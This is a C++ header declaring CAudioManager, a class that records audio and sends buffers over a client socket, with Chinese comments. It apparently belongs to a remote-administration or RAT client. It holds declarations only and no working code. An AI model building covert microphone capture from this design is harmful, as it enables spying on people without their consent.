// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__F956E94C_3AA6_4515_A76D_F18CD598ED74__INCLUDED_)
#define AFX_AUDIOMANAGER_H__F956E94C_3AA6_4515_A76D_F18CD598ED74__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "..\..\..\common\audio.h"
class CAudioManager : public CManager  
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
public:
	void OnReceive( LPBYTE lpBuffer, UINT nSize );
	int sendRecordBuffer();
	static DWORD WINAPI WorkThread(LPVOID lparam);
    static bool m_bIsWorking;           //判断线程是否在工作
	
private:
	
	CAudio	*m_lpAudio;             //音频录制的类
	HANDLE	m_hWorkThread;          //录制线程
protected:
	bool Initialize();
};

#endif // !defined(AFX_AUDIOMANAGER_H__F956E94C_3AA6_4515_A76D_F18CD598ED74__INCLUDED_)
